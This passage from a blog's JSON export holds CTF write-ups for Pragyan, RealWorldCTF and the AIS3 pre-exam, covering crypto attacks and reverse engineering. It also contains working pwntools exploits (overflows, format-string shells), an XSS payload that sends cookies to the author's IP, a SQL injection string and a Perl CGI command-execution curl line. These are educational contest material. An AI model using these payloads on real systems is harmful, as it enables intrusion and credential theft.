1-d301da5536a5d8b8e2be50a7584127eb3704025f048cf72335f1b301b852b30a2-e1af01e2f7887b63c068823cbcd812f91899678656456db71dfa9ab1fbb1bd263-dc60d55a411ccfd4a44e6a9799774dd6207dffdfcab4b442075ead165fa7ecb4-510c9c8f6aaacebf16bb5fd9e2cd8c0845ec483bd49bf57fa4151e5b672c73b05-bd4f58a846bb9e47a7402e22df13002aef3bf3048011674269eaff39154c62bf6-7c61f3ee00ab759a6853f041e74ae2378144a96b662230888d6ba6412c6461907-d01f29e42de0ab1fb183a35d06a2ac6117acaad2b3017671846c7b380e83d6bb8-1268bf4430c0b1a4c568a302da92421bc672aceb57fef3401f2434cfc3bf740b9-b52781fd38b0185bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9da-424b493442128adbeef5ce33f18c6c5996cdd97e4922644a4479bb4e05f8846f Guess the hexadecimal digits split by - are x and y on the x-y plane, then ….We have to sovle an equation which derives from these coordinates by Lagrange polynomial. I did’t decrypt it on my own implementation, the problems is that I used the wrong the prime. Using a github repo call secret-sharing to help me. plain text:pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125;\\n flag:pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125; reference Help RabinIt’s Rabin cryptosystem, which needs the factor p, q of n to do the decryption. The problem in here is that it generates n by mutiple two primes which are close to each other, this makes us are able to factor n by brute force. brute.pyfrom decimal import *from Crypto.PublicKey import RSAkey = RSA.importKey(open(&quot;./publickey.pem&quot;).read())getcontext().prec = 200n = Decimal(key.n)p = n.sqrt()while n % p != 0: p += 1q = n/p(p,q) = (int(p),int(q)) Then follow the steps on wiki, we can get the plaintext in one of the 4 decrypted messages: Hey Rabin, would you like to be the front end to my back end? Here is your flag: pctf&#123;R4b1n_1s_th3_cut3st&#125; flag:pctf&#123;R4b1n_1s_th3_cut3st&#125; Easy RSAIt gives some parameter used in RSA e=217356749319385698521929657544628507680950813122965981036139317973675569442588326220293299168756490163223201593446006249622787212268918299733683908813777695992195006830244088685311059537057855442978678020950265617092637544349098729925492477391076560770615398034890984685084288600014953201593750327846808762513n=413514550275673527863957027545525175432824699510881864021105557583918890022061739148026915990124447164572528944722263717357237476264481036272236727160588284145055425035045871562541038353702292714978768468806464985590036061328334595717970895975121788928626837881214128786266719801269965024179019247618967408217c=337907824405966440030495671003069758278111764297629248609638912154235544001123799434176915113308593275372838266739188034566867280295804636556069233774555055521212823481663542294565892061947925909547184805760988117713501561339405677394457210062631040728412334490054091265643226842490973415231820626551757008360 The e is too big so that may cause the d become small enough to satisfy the condition for wiener’s attackI used featherduster to apply weiner’s attack here and get d successfully d=12978409760901509356642421072925801006324287746872153539187221529835976408177 The secret message is Here is your flag, pctf&#123;Sup3r_st4nd4rd_W31n3r_4tt4ck&#125;\\n flag:pctf&#123;Sup3r_st4nd4rd_W31n3r_4tt4ck&#125; Decode ThisThere is a linear equations : z = (x*key[0][0] + y*key[0][1])%26 + 97w = (x*key[1][0] + y*key[1][1])%26 + 97 Cuz we know that there must be a pctf in plain text, it’s able to solve this equation. I didn’t get the flag in my first trial, cuz I assume that pctf is the prefix of plaintext. After a while, I realized that crypto challenges of Pragyan always like to give us some xxxxxxx flag: pctf&#123;xxxxxxx&#125;, so , all we need to do here is to brute force the position of pctf in the plaintext. Solving equation is ez in python, because there are lots of package doing this for us (z3, Sympy, sage … etc). ram has a little secret for you right here it is pctf i like climbing hills what about you MiscellaneousEXORcismIt gives a txt file which contains lots of 1\\n and 0\\n, it’s a bitmap of an QRcodeConvert it to image by python The message is 160f15011d1b095339595138535f135613595e1a, a meaningless stringXor the first 4 char with pctf to check if this was the xor result of flag , then the xor-key turned out to be flag. flag:pctf&#123;wh4_50_53r1u5?&#125; BinaryFeed_meLazy, use socket and z3 to solve this flag:pctf&#123;p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3&#125; Secret KeeperLogin as admin then it will print flag Obviously, it has a UAF bug after remove a user. It just clean and free the chunk of account, but not remove the user from the list, we can even login with null usernam and original password.What’s more, the first registed user’s username can be rewrote as admin exploitFirst, register a user with name whatever and password whateverpassword, then delete itNext, register another user with name whatever2 and password adminCuz this binary malloc for password first, the chunk which second registed user using for password is actually the same chunk of the first user’s usernameNow we can login as admin with password whateverpassword to get the flag. flag:pctf&#123;&quot;ThiS_S3rV1ce-1s$t0T411Y-cR4p_But_w3_34Rn_$$_4nyWaYs&quot;&#125; Super Secure VaultThe binary ask for key and password.The key has to satisfy some modular equations : key % 27644437 == 213key % 10459 == 229key % 1489 == 25key % 1046527 == 83key % 16127 == 135 We can derive key easily from these equations by CRT (Chinese Remainder Theorem), which is 3087629750608333480917556 If the key passes the verification , binary concats 27644437104591489104652716127 and 08 after the key in the func2. Then it will try to verify password by looking up a hard-coded array , matrix. In summary, it’s trivial, can be done by idapython. ida_sovler.pyfrom idaapi import *matrix = LocByName(&quot;matrix&quot;)key = &quot;3087629750608333480917556&quot; + &quot;27644437104591489104652716127&quot; +&quot;08&quot;v8 = 0v10 = len(key)/2passwd = []while v8 &lt; len(key)/2: idx = int(key[v8:v8+2]+key[v10:v10+2]) passwd.append(Byte(matrix+idx)) v8 += 2 v10 += 2v9 = 0v11 = len(key)/2while v9 &lt; len(key)/2: v4 = int(key[v9:v9+2]) v5 = int(key[v11:v11+2]) passwd.append(Byte(matrix+ 100*(v4*v4%97)+(v5*v5%97))) v9 += 2 v11 += 2print &#x27;&#x27;.join(map(chr,passwd)) flag:pctf&#123;R3v3rS1Ng_#s_V311_L0t_Of_FuR&#125; ArmouryFormat string vulneralbility, leak the GOT entry and find the correct version of libc.Then use %n in format string to overwrite the return address to one gadget. flag:pctf&#123;“W@r_1sN3v3R@_las41nG_s0lut1on#f0R_any_pr0bleM”&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Pragyan","slug":"Pragyan","permalink":"http://blog.terrynini.tw/tags/Pragyan/"}]},{"title":"2018::Reversing.KR::Record","slug":"2018-Reversing-KR-Record","date":"2018-08-07T08:38:41.000Z","updated":"2024-06-20T16:45:58.812Z","comments":true,"path":"tw/2018-Reversing-KR-Record/","permalink":"http://blog.terrynini.tw/tw/2018-Reversing-KR-Record/","excerpt":"趁著 DEFCON26 Final 前終於把 reversing.kr 全解了","text":"趁著 DEFCON26 Final 前終於把 reversing.kr 全解了 截了一條有夠長的圖片，紀錄一下姑且算是第26個解完的人 總結一下：韓國的題目真的滿好玩的，很多題目找到關鍵點後其實就不難，但是在關鍵部分前面會有很多代碼混淆或是 anti-debug 需要花點時間還有精力，題目偶爾會跟數學有點關係，例如 CRC、CRC2、Multiplicative，從平台來分類的話，windows 居多，包括一些 UWP 的逆向，windows 在 CTF 一直都不是主流，所以競賽時 windows 的題目不多，接下來要繼續找有趣的題目玩了。","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"}]},{"title":"2018::RealWorldCTF::Qual","slug":"2018-RealWorldCTF-Qual","date":"2018-07-30T05:11:03.000Z","updated":"2024-06-20T16:46:00.308Z","comments":true,"path":"en/2018-RealWorldCTF-Qual/","permalink":"http://blog.terrynini.tw/en/2018-RealWorldCTF-Qual/","excerpt":"RealWorld CTF is very interesting and that is the hardest check-in challenge I’ve ever saw.","text":"RealWorld CTF is very interesting and that is the hardest check-in challenge I’ve ever saw. AdvertisementThis challenge gave nothing, but just one line This platform is under protection. DO NOT hack it. Trying not to hack the web, but I can’t find anything.I did find something interesting, like this one: It seems to use WebSocket to get some information then render it on template view.So, let’s change the hash-like string on url. When url is https://realworldctf.com/contest/5 When url is https://realworldctf.com/contest/5b5bc8c532a7ca004d2d0f64 (Make the length of hash-like string consist with origin) Did you say Database?https://realworldctf.com/contest/&#39; or &#39;1&#39;=&#39;1&#39; -- My teamate kaibro told me that chaitin has sqlchop product…. ohh…. advertisement… got itIt took me half day to find the flag Dot FreeThere are some js functoin on web page: function lls(src) &#123; var el = document.createElement(&#x27;script&#x27;); if (el) &#123; el.setAttribute(&#x27;type&#x27;, &#x27;text/javascript&#x27;); el.src = src; document.body.appendChild(el); &#125;&#125;;function lce(doc, def, parent) &#123;// ...&#125;;window.addEventListener(&#x27;message&#x27;, function (e) &#123; if (e.data.iframe) &#123; if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(&#x27;.&#x27;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;//&quot;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;。&quot;) == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != &#x27;object&#x27;)) &#123; if (e.data.iframe.type == &quot;iframe&quot;) &#123; lce(doc, [&#x27;iframe&#x27;, &#x27;width&#x27;, &#x27;0&#x27;, &#x27;height&#x27;, &#x27;0&#x27;, &#x27;src&#x27;, e.data.iframe.value], parent); &#125; else &#123; lls(e.data.iframe.value) &#125; &#125; &#125;&#125;, false);window.onload = function (ev) &#123; postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), &#x27;*&#x27;)&#125; And I found some keyword like login passwd,login account in css, so I think that we can try to XSS. We append string to url, the xxxxxxxx part sould replaced by ip in integer form:http://13.57.104.34/?&#123;&quot;iframe&quot;:&#123;&quot;value&quot;:&quot;http:\\\\\\\\xxxxxxxx&quot;&#125;&#125; And put a javascript on your machine:document.location=&quot;http:\\\\\\\\my.ip.put.here/a?cookie=&quot;+document.cookie; Then go to apache log to get the flag:13.57.104.34 - - [29/Jul/2018:14:36:15 +0000] &quot;GET /a?cookie=flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1&quot; 404 496","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"RealWorldCTF","slug":"RealWorldCTF","permalink":"http://blog.terrynini.tw/tags/RealWorldCTF/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"2018::AIS3::pre-exam","slug":"2018-AIS3-pre-exam","date":"2018-06-13T02:20:22.000Z","updated":"2020-07-05T13:15:30.000Z","comments":true,"path":"tw/2018-AIS3-pre-exam/","permalink":"http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/","excerpt":"時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間題目都還滿簡單的，有些題目滿有趣的","text":"時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間題目都還滿簡單的，有些題目滿有趣的 先附上人權，聊天室好像有人以為我是出題者，我只是覺得抱怨題目可以，但是你要給出邏輯Ｒ大家都有解這題，都要花時間，就是有人解得快啊不然就倒著解，50 - 2 還有 48 分直接衝上第一Ｒ簡單的太難解，你有試過先解難的嗎 Rev-1:find題目名字我有點忘了，應該是 find 拉，反正他就是一個什麼都沒有的 ELF 要你找 flag，就 strings 下去，就會發現一堆 AIS3，ais3 的字樣，小寫的都是一些對話，大寫的有一堆大括號，不過中間有偷夾個flag AIS3&#123;StrINg$_And_gR3P_I5_U$eFu1&#125; Rev-2:secret總之這程式裡面有個區塊是寫好的密文，從init可以發現他原始加密的方式就是srand(0)之後，一直呼叫rand()%2018然後xor後，就是這段secret的值，所以他程式才會一直要你輸入，只要你的輸入能夠還原當初他亂數的過程，xor出來的就會是flag，他會把解密的flag放到/tmp/secret裡面，原本程式的邏輯是這樣： 從組語那邊把他 patch 成這樣： 跑完就有 flag 了 AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd} Rev-3:crackme就是一個 crackme 的樣子，.NET 寫的，用工具把 .NET 的 IR decompile 回類似 C# 的程式，就會找到關鍵的xor的部分，他裡面有一堆yanny，laurel之類的變數，寫個腳本讓每個變數 xor 171 就是 flag 了 cipher = &quot;&quot;&quot;// Token: 0x0400000A RID: 10\\n\\t\\tprivate const int yanny = 234;\\n\\n\\t\\t// Token: 0x0400000B RID: 11\\n\\t\\tprivate const int laurel = 226;\\n\\n\\t\\t// Token: 0x0400000C RID: 12\\n\\t\\tprivate const int yammy = 248;\\n\\n\\t\\t// Token: 0x0400000D RID: 13\\n\\t\\tprivate const int laurol = 152;\\n\\n\\t\\t// Token: 0x0400000E RID: 14\\n\\t\\tprivate const int yommy = 208;\\n\\n\\t\\t// Token: 0x0400000F RID: 15\\n\\t\\tprivate const int lourel = 154;\\n\\n\\t\\t// Token: 0x04000010 RID: 16\\n\\t\\tprivate const int yonmy = 223;\\n\\n\\t\\t// Token: 0x04000011 RID: 17\\n\\t\\tprivate const int lauril = 244;\\n\\n\\t\\t// Token: 0x04000012 RID: 18\\n\\t\\tprivate const int yamny = 226;\\n\\n\\t\\t// Token: 0x04000013 RID: 19\\n\\t\\tprivate const int laure1 = 158;\\n\\n\\t\\t// Token: 0x04000014 RID: 20\\n\\t\\tprivate const int yanmy = 244;\\n\\n\\t\\t// Token: 0x04000015 RID: 21\\n\\t\\tprivate const int lauro1 = 238;\\n\\n\\t\\t// Token: 0x04000016 RID: 22\\n\\t\\tprivate const int yammi = 234;\\n\\n\\t\\t// Token: 0x04000017 RID: 23\\n\\t\\tprivate const int loure1 = 216;\\n\\n\\t\\t// Token: 0x04000018 RID: 24\\n\\t\\tprivate const int yemmy = 210;\\n\\n\\t\\t// Token: 0x04000019 RID: 25\\n\\t\\tprivate const int leurel = 244;\\n\\n\\t\\t// Token: 0x0400001A RID: 26\\n\\t\\tprivate const int yemny = 223;\\n\\n\\t\\t// Token: 0x0400001B RID: 27\\n\\t\\tprivate const int leural = 228;\\n\\n\\t\\t// Token: 0x0400001C RID: 28\\n\\t\\tprivate const int yenmy = 244;\\n\\n\\t\\t// Token: 0x0400001D RID: 29\\n\\t\\tprivate const int leurol = 232;\\n\\n\\t\\t// Token: 0x0400001E RID: 30\\n\\t\\tprivate const int yenny = 249;\\n\\n\\t\\t// Token: 0x0400001F RID: 31\\n\\t\\tprivate const int leuro1 = 159;\\n\\n\\t\\t// Token: 0x04000020 RID: 32\\n\\t\\tprivate const int yenmi = 200;\\n\\n\\t\\t// Token: 0x04000021 RID: 33\\n\\t\\tprivate const int louro1 = 192;\\n\\n\\t\\t// Token: 0x04000022 RID: 34\\n\\t\\tprivate const int yomny = 244;\\n\\n\\t\\t// Token: 0x04000023 RID: 35\\n\\t\\tprivate const int leure1 = 230;\\n\\n\\t\\t// Token: 0x04000024 RID: 36\\n\\t\\tprivate const int yonny = 206;\\n\\n\\t\\t// Token: 0x04000025 RID: 37\\n\\t\\tprivate const int lauri1 = 138;\\n\\n\\t\\t// Token: 0x04000026 RID: 38\\n\\t\\tprivate const int yamni = 214;&quot;&quot;&quot;.split(&#x27; = &#x27;)[1:]flag = &#x27;&#x27;.join(map(chr,[ int(x[:3])^171 for x in cipher]))print flag AIS3{1t_I5_EAsy_tO_CR4ck_Me!} Rev-4:calc我還以為又是 windows 的計算機，原來是 Golang，他沒把 debug 訊息拿掉，看起來很快，程式要你輸入兩把 key ，然後把兩個陣列中的每個字元都對應相加，如果跟他程式內存的一個陣列相同的話 sever 就會把 flag 吐給你，輸入有限制，最長的 key 長度應該要是 0x19 ，這裡他題目有說 Unicode ，其實就是 Golang 中rune的特性，如果是用別的陣列，存取 Unicode 的時候會被拆解成多個 byte，但是rune會照著 Unicode 切，也就是int32的大小，而他程式中用來驗證的那個陣列也是rune，當中有包含 Unicode這題也不用去把它拆成兩把 key，就把第二把 key 空著，把它程式裡面那個數值直接當第一把 key 送進去就會過了然後因為 Golang 跟 gdb 之間有點小問題，所以用 gdb 在本地跑 payload 會跑不過 from pwn import *r = remote(&quot;104.199.235.135&quot;,2115)a = [u&#x27;\\ufffd&#x27;,u&#x27;\\u006d&#x27;,u&#x27;\\ufffd&#x27;,u&#x27;\\u000f&#x27;,u&#x27;\\u006f&#x27;,u&#x27;\\u0058&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0031&#x27;,u&#x27;\\u0073&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u0048&#x27;,u&#x27;\\u0030&#x27;,u&#x27;\\u0000&#x27;,u&#x27;\\ufffd&#x27;,u&#x27;\\u0053&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0063&#x27;,u&#x27;\\u0054&#x27;,u&#x27;\\u0046&#x27;,u&#x27;\\u0020&#x27;,u&#x27;\\u0074&#x27;,u&#x27;\\u003a&#x27;,u&#x27;\\u006d&#x27;]print r.recvuntil(&quot;&gt;&quot;)r.sendline(&quot;1&quot;)print r.recvuntil(&quot;&gt;&quot;)r.sendline(&#x27;&#x27;.join(a).encode(&quot;utf8&quot;))print r.recvuntil(&quot;&gt;&quot;)r.sendline()print r.recvuntil(&quot;&gt;&quot;)r.sendline(&quot;2&quot;)r.interactive() AIS3{G0_gO_g0_T0_h1Gh_!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz} Pwn-1:mail程式有個 reply function，只要跳進去就給 flag，程式的輸入是用gets，直接 buffer overflow 就好了 #!/usr/bin/env python2from pwn import *r = remote(&quot;104.199.235.135&quot;,2111)reply = p64(0x400796)r.recvuntil(&quot;reciever: &quot;)r.sendline(&quot;terrynini&quot;)r.recvuntil(&quot;content: &quot;)r.sendline(cyclic(840)+reply)r.interactive() _AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!I_d0nt_3ant_t0_giu3_QwQ} Pwn-2:darling忘記補進度了，考完段考來看 darling，這題只限制了上界沒限制下界，所以能夠改寫 stack ，雖然不能改掉現在這個 stack frame 的 return address，但是可以修改後面的，把 printf 的 return address 改掉就好了 #!/usr/bin/env python2from pwn import *r = remote(&quot;104.199.235.135&quot;, 2112)r.recvuntil(&quot;Index: &quot;)r.sendline(&quot;-5&quot;)r.recvuntil(&quot;Code: &quot;)r.sendline(&quot;4196310&quot;)r.interactive() AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&amp;_10w3r_bounp} Pwn-3:justfmt這裡有 format string 的漏洞，我們可以把 got 表中的vprintf(0x4f040)修改成鄰近的__libc_system(0x46590)，不過從右邊數來第二個 byte 因為受到 ASLR 的影響要撞 $\\frac{1}{16}$ 的機率 #!/usr/bin/env python2from pwn import *while True: try: r = remote(&quot;104.199.235.135&quot;,2113) print r.recvuntil(&quot;:&quot;) plt = 0x601030 r.sendline(&quot;sh\\n\\n%21900c%8$hn&quot;+p64(plt)) m = r.recvuntil(p64(plt)) r.sendline(&quot;ls&quot;) m = r.recv() r.interactive() print m except EOFError: r.close() print &quot;try again&quot; AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!} Pwn-4:MagicWorld這題一樣有 format string 的問題，我們可以 leak 在 stack 上面main的 return address 來找到 libc_start_main，推算 libc base，然後找到 one gadget的位置在Try a spell選項裡面有多讀一個 byte，我們可以用這個 byte 來做 stack pivot，然後控制 rip 流程，跳到 one gadget 裡面，就可以拿到 shell 了 #!/usr/bin/env python2from pwn import *while True: try: r = remote(&quot;104.199.235.135&quot;,2114) magic = 0x46428 r.recvuntil(&quot;Choice: &quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;spell: &quot;) r.sendline(&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p&quot;) r.recvuntil(&quot;Regist: &quot;) r.sendline(&quot;2&quot;) libc = r.recvuntil(&quot;\\n&quot;)[-16:-1].split(&quot;x&quot;) print libc libc = int(libc[len(libc)-1],16) print &quot;libc_start_main: &quot; +hex(libc) libc = libc - 0x21f45 magic = libc+magic print &quot;libc_base: &quot; +hex(libc) print &quot;magic: &quot; + hex(magic) spell_rbp = p64(magic).ljust(16,&quot;\\0&quot;) + &quot;h&quot; print spell_rbp r.recvuntil(&quot;Give me your spell: &quot;) r.send(spell_rbp) r.sendline(&quot;cat flag&quot;) r.interactive() except: r.close() print &quot;try again&quot; AIS3{m1gRatlon_&amp;_b0f_13_Qu1t3_3asY!!!} Crypto-1:POW總之讓你算 proof of work，為後面的題目做準備，然後我在聊天室有看到有人說 pool 對就會算得快，基本上這概念是錯的這裡的 proof of work 其實就是 hashcash 也就是 blockchain 裡面那個鬼東西，如果有個特定的 pool 算比較快……，可以讓我投資嗎？總之這邊就是 +1 +1 這樣慢慢算，不要用隨機的，程式裡的隨機是 pseudo random ，會一直撞到剛剛算過的值 AIS3{Spid3r mAn - H3L1O wOR1d PrO0F 0F WOrK} Crypto-2:XOR他把明文跟 key 串接在一起，然後用 key 對這個新的字串做 xor 加密，encrypt.py中看得出來 key 的長度在 8~12，這種加密會造成的問題是，可以用最後 8~12 個字元，來推算出 key 的長度從 flag 形式可以知道明文開頭是 AIS3&#123; ，用密文做 xor 得到 key 的前五個 byte，測試一下會發現 key 長度是 10 ，然後把 key 剩下的部分炸開就好了 key = key[:5]for i in range(0,5): for trial in range(0,256): if chr(trial^ord(cipher[-6+i])) == key[-1]: key += chr(trial) print trial breakflag = &#x27;&#x27;.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) for i in range(len(cipher)) ])print flag AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.} Crypto-3:IOU這題用 RSA 來 sign 一個借據，sign 跟 encrypt 的差別在於：sign 用私鑰加密即$m^{d} \\equiv c;mod;N$，encrypt 用公鑰加密即$m^{e} \\equiv c;mod;N$，所以這裡的 sign 其實沒用什麼特別的算法，官方也不推薦直接使用 sign ，應該要用 PKCS 之類的東西來簽才對 這題的問題在於，他沒有驗證全部的訊息，他直接 split 找第四個元素，看他是不是 10，因此我們只要造假一個第四個元素 &gt; 10 的明文就好了，要造假簽章我們要通過key.verify，但是因為我們有公鑰 (N, e)，我們可以逆過來玩，只要隨便亂弄一個密文s，就可以得到一個亂七八糟的明文 m &#x3D; ($s^e$ mod N)，這東西一定會通過key.verify，然後有沒有通過 &gt; 10 就是靠運氣，所以一直撞到過就會有 flag 了 fake_s = &quot;&quot;c = 0while True: try: cc = int(&#x27;&#x27;.join(c)) m = pow(cc, e, n) test = long_to_bytes(m) bucks = int(test.split()[3]) print bucks, if bucks &gt; 10: fake_s = str(cc) break except EOFError: break except: pass c += 1print str(m)print fake_s print &quot;find&quot; AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE} Crypto-4:EFAIL這題腳本寫到一半，總之利用 CBC 的弱點，在知道明文的情況下，我們可以替換密文來修改明文，例如我們有 $C_0, P_1, Fake$，我們把本來$C_0$的地方替換成$C_0 \\oplus P_1 \\oplus Fake$，這樣$C_1$解密完後會 xor 到錯誤的值，讓本來的 $C_0\\oplus P_1$無法還原成$P_1$而變成$Fake$，然後他有提供web這個上網的指令，把flag前面改成web &#39;mydoman.tw，我們就可以去自己的 domain 撈到 flag，注意到後面過幾行有句英文有&#39;，他會把這整段都當網址訪問，所以不用自己再加一個&#39;來閉合 Web-1:warmup連到 http://104.199.235.135:31331/index.php\\?p=7 發現 header 裡面有一欄 Partial-Flag:d，推測 URL 裡面的 p 表示是 flag 中的第 p 個字元，所以變動 index 拼出 flag for i in &#123;0..50&#125;do curl -v http://104.199.235.135:31331/index.php\\?p\\=$i 2&gt;&amp;1 | grep Flag | awk &#x27;&#123;printf $3&#125;&#x27; | tr -d &#x27;\\r&#x27; &gt;&gt; flag.txt done AIS3{g00d! u know how 2 check H3AD3R fie1ds.} Web-2:hidden先到 robots.txt 會找到一個連結叫做 _hidden_flag_.php他會倒數個 1x 秒然後跳出一個按鈕到下一頁他其實送出了一個有兩個隱藏欄位 c，s 的表單，用來取得下次的 c，s值，直到某個關鍵點就會給 flag 了寫個腳本讓他飛一會兒，要跑 17xxx 次才結束 import requestsimport rer = requests.get(&quot;http://104.199.235.135:31332/_hidden_flag_.php&quot;)while &quot;no flag here&quot; in r.text: m = re.findall(&#x27;value=&quot;([A-Za-z0-9]*)&quot;&#x27;,r.text) for i in m: print i r = requests.post(&#x27;http://104.199.235.135:31332/_hidden_flag_.php&#x27;, data = &#123;&#x27;c&#x27;:m[0],&#x27;s&#x27;:m[1]&#125;) print r.textprint r.headers AIS3{g00d_u_know_how_2_script_4_W3B_3e02c41e2d6243765575b12442bc8480} Web-3:sushi題目是 php，關鍵的一行是他用eval包住了die，這裡我們可以用 php 神秘的特性，參考 Orange 的 blog其中@是用來抑制錯誤訊息，然後有限制字串長度不能超過 16 ，而且不可以包含 &#39;，&quot;先看目錄下有什麼檔案 http://104.199.235.135:31333/?%F0%9F%8D%A3=$&#123;@print(`ls`)&#125; 目錄下有 phpinfo.php，index.php，flag_name_1s_t00_l0ng_QAQQQQQQ，這邊用低端解法，直接存取XDDD http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ 不過如果不幸的不能直接存取，其實可以用截斷的方式來讓 php 誤判我們放進去 GET 的字串長度，來進行任意長度的 command injection AIS3{php_is_very_very_very_easyyyyyy} Web-4:perljam這題看起來空空如也，不過有 git leak 的問題，總之抓下來會找到一段關鍵的 upload 程式碼 use strict;use warnings;use CGI;my $cgi = CGI-&gt;new;print $cgi-&gt;header();print &quot;&lt;body style=\\&quot;background: #caccf7 url(&#x27;https://i.imgur.com/Syv2IVk.png&#x27;);padding: 30px;\\&quot;&gt;&quot;;print &quot;&lt;p style=&#x27;color:red&#x27;&gt;No BUG Q_____Q&lt;/p&gt;&quot;;print &quot;&lt;br&gt;&quot;;print &quot;&lt;pre&gt;&quot;;if( $cgi-&gt;upload(&#x27;file&#x27;) ) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); while(&lt;$file&gt;) &#123; print &quot;$_&quot;; &#125;&#125;print &quot;&lt;/pre&gt;&quot;; 可以參考 black hat 的一個簡報，我們可以造假一個 file 來做到 RCE本題不能直接cat flag，權限不夠，在根目錄下面有支可以讀取 flag 的程式，我們要執行他來取得 flag echo &quot;trash&quot; | curl -F &quot;file=ARGV&quot; -F &quot;file=@-&quot; &quot;http://104.199.235.135:31334/cgi-bin/index.cgi?/readflag|&quot; AIS3{here_is_your_flag} Misc-1:welcome看教學影片，裡面有 flag AIS3{Maybe_This_is_the_Flag_You_Want} Misc-2:flag三隻假 flag，圖片上的，strings 出來的， pkcrack 出來的都是假的。本來就覺得他給的圖上的點點看起來很不整齊，猜測是摩斯電碼，吃完晚餐回來一下就過了，不過圖片是 jpeg 壓縮的關係有點模糊，總之對著翻譯出來就是 flag AIS3{YOUFINDTHEREALFLAGOHYEAH} Misc-3:svegamp3 音訊隱寫，用 MP3stego 加密的，沒有設定 password ，decode 下去就是 flag AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6} Misc-4:blind這題還沒來得及想，聽 Maojui 講了個大概，是有趣的一題。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"OS::NachOS::HW1","slug":"OS-NachOS-HW1","date":"2018-05-28T16:25:15.000Z","updated":"2022-10-16T06:34:59.000Z","comments":true,"path":"tw/OS-NachOS-HW1/","permalink":"http://blog.terrynini.tw/tw/OS-NachOS-HW1/","excerpt":"InstallNachOS 必須要裝在 32bits 的環境下，如果要裝在 64bits 下要進行 patch patch -p1 &lt; nachos-linux-64bit.diff","text":"InstallNachOS 必須要裝在 32bits 的環境下，如果要裝在 64bits 下要進行 patch patch -p1 &lt; nachos-linux-64bit.diff Multiprogramming在還未對 NachOS 進行修改的時候，執行 test1、test2 時會發現跟 source code 的行為不一樣。 ./nachos –e ../test/test1 –e ../test/test2 因為原本的 NachOS 並沒有為多個程式做記憶體的管理，雖然有開啟虛擬記憶體，但是基本上沒有作為，所以當多份程式同時執行時就會重疊到其他程式正在使用的 page ，然後發生錯誤，為此我們要修改 code/userprog/addrspace.cc、code/userprog/addrspace.h，使程式的虛擬記憶體映射到沒有人使用的實體記憶體，而不是互相糾纏。 首先從 addrspace.cc 開始，建構式直接弄了一個跟實體記憶體一樣大的 pageTable ， 然後還全數映射，但是其實我們的程式沒這麼大，我們只要分配到跟程式一樣大就好了，不過程式的大小必須要到讀了檔案格式才會知道，所以我們可以把這整段 code 註解掉，把映射記憶體這件事挪到 AddrSpace::Load 中。 還有一行 bzero(kernel-&gt;machine-&gt;mainMemory, MemorySize); 不曉得為什麼被註解了，不過應該要清空記憶體才對，但將記憶體分給多個程式後就不能這樣暴力的把所有記憶體清零，所以我在後面的程式會每分配一頁就清空一頁的記憶體。 code/userprog/addrspace.ccAddrSpace::AddrSpace()&#123; pageTable = new 